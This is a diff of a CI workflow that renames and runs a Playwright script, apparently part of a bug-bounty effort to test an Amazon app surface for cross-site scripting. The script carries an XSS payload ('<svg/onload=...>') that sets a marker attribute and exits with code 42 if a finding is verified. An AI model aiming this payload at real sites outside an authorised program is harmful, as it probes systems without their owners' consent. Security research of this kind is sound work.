@@ -25,7 +25,7 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          cat > /tmp/probe.mjs <<'JS'
+          cat > amazon-app-xss-probe.mjs <<'JS'
           import { chromium } from "playwright";
           const ua="amazonvrpresearcher_pradyuman1";
           const p="<svg/onload=document.body.dataset.h1xss=1>";
@@ -61,4 +61,4 @@ jobs:
           if(!finding) console.log("NO_VERIFIED_APP_SURFACE_XSS");
           if(finding) process.exit(42);
           JS
-          node /tmp/probe.mjs
+          node amazon-app-xss-probe.mjs
